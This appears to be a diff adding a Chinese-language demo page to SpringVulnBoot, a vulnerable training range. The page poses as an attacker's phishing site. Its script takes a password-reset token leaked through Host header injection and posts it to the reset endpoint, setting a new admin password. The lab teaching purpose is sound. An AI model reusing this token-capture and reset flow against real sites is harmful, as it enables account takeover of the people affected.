@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <title>密码重置 - SpringVulnBoot</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+      background: #f5f7fa;
+      padding: 30px;
+      color: #303133;
+    }
+    .container { max-width: 720px; margin: 0 auto; }
+    .warning {
+      background: #fff3e0;
+      border: 2px solid #e67e22;
+      border-radius: 6px;
+      padding: 14px 18px;
+      margin-bottom: 18px;
+      color: #6f4400;
+      line-height: 1.7;
+    }
+    .warning b { color: #d35400; }
+    .card {
+      background: #fff;
+      border-radius: 8px;
+      padding: 28px;
+      box-shadow: 0 2px 12px rgba(0,0,0,.08);
+    }
+    h2 { font-size: 20px; margin-bottom: 18px; color: #303133; }
+    h3 { font-size: 16px; margin: 16px 0 8px; color: #606266; }
+    .field { margin-bottom: 14px; }
+    label { display: block; font-size: 13px; color: #606266; margin-bottom: 6px; }
+    .value-box {
+      background: #f5f7fa;
+      border: 1px solid #dcdfe6;
+      border-radius: 4px;
+      padding: 8px 12px;
+      font-family: Consolas, Monaco, monospace;
+      font-size: 13px;
+      word-break: break-all;
+      color: #c0392b;
+    }
+    input {
+      width: 100%; padding: 8px 12px; font-size: 14px;
+      border: 1px solid #dcdfe6; border-radius: 4px; color: #606266;
+    }
+    .btn {
+      width: 100%; padding: 12px;
+      background: #f56c6c; color: #fff;
+      border: none; border-radius: 4px;
+      font-size: 15px; font-weight: 500; cursor: pointer;
+      transition: background .2s;
+    }
+    .btn:hover { background: #f78989; }
+    .btn:disabled { background: #c0c4cc; cursor: not-allowed; }
+    .result {
+      margin-top: 16px; padding: 12px 14px;
+      border-radius: 4px; font-size: 14px;
+      line-height: 1.7;
+      display: none;
+    }
+    .result.success { background: #f0f9eb; color: #67c23a; border: 1px solid #c2e7b0; display: block; }
+    .result.error { background: #fef0f0; color: #f56c6c; border: 1px solid #fbc4c4; display: block; }
+    .steps {
+      margin-top: 18px; padding: 14px 18px;
+      background: #f4f4f5; border-left: 4px solid #909399;
+      border-radius: 4px; color: #606266; line-height: 1.8; font-size: 13px;
+    }
+    .steps b { color: #303133; }
+    code { color: #c0392b; background: #fdf2f0; padding: 1px 4px; border-radius: 2px; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+
+  <div class="warning">
+    ⚠️ <b>这里是攻击者控制的钓鱼站点（端口 81）</b><br>
+    真实场景下被害人看到的是与 bank.com 视觉一致的"重置密码"页面，没有这个提示框。<br>
+    攻击者收到 token 后，可以选择"立即接管"或"保存 token 慢慢用"。
+  </div>
+
+  <div class="card">
+    <h2>🔐 密码重置（攻击者已捕获 token）</h2>
+
+    <div class="field">
+      <label>从 URL Query 抓取到的 token：</label>
+      <div class="value-box" id="token">(等待加载...)</div>
+    </div>
+
+    <div class="field">
+      <label>目标用户的新密码（默认值，可自定义）：</label>
+      <input type="text" id="newPassword" value="hacked_by_host_header">
+    </div>
+
+    <button class="btn" id="hijackBtn" onclick="hijack()">用此 token 接管账号</button>
+
+    <div class="result" id="result"></div>
+
+    <div class="steps">
+      <b>接管之后请：</b><br>
+      1. 回到靶场前端 <code>http://127.0.0.1</code><br>
+      2. 退出当前登录 → 用 <code>admin / hacked_by_host_header</code> 登录<br>
+      3. 验证：登录成功 → 账号已被接管<br>
+      4. 演示完成后，登录"个人中心"将密码改回原值
+    </div>
+  </div>
+
+</div>
+
+<script>
+  var token = new URLSearchParams(location.search).get('token');
+  document.getElementById('token').textContent = token || '(URL 中无 token 参数)';
+  if (!token) {
+    document.getElementById('hijackBtn').disabled = true;
+  }
+
+  var backendUrl = window.location.protocol + '//' + window.location.hostname + ':8080';
+
+  async function hijack() {
+    var newPassword = document.getElementById('newPassword').value;
+    var resultBox = document.getElementById('result');
+    var btn = document.getElementById('hijackBtn');
+
+    if (!token) {
+      resultBox.className = 'result error';
+      resultBox.textContent = '❌ 未抓到 token，无法接管';
+      return;
+    }
+    if (!newPassword) {
+      resultBox.className = 'result error';
+      resultBox.textContent = '❌ 新密码不能为空';
+      return;
+    }
+
+    btn.disabled = true;
+    btn.textContent = '接管中...';
+
+    try {
+      var resp = await fetch(backendUrl + '/hostHeaderInjection/reset', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ token: token, newPassword: newPassword })
+      });
+      var json = await resp.json();
+      if (json.code === 0) {
+        resultBox.className = 'result success';
+        resultBox.innerHTML =
+          '✅ ' + (json.data || '账号接管成功') +
+          '<br>现在可以用 <code>' + newPassword + '</code> 登录受害人账号了。';
+      } else {
+        resultBox.className = 'result error';
+        resultBox.textContent = '❌ ' + (json.msg || json.data || '接管失败');
+        btn.disabled = false;
+        btn.textContent = '用此 token 接管账号';
+      }
+    } catch (e) {
+      resultBox.className = 'result error';
+      resultBox.textContent = '❌ 请求异常：' + e.message;
+      btn.disabled = false;
+      btn.textContent = '用此 token 接管账号';
+    }
+  }
+</script>
+
+</body>
+</html>
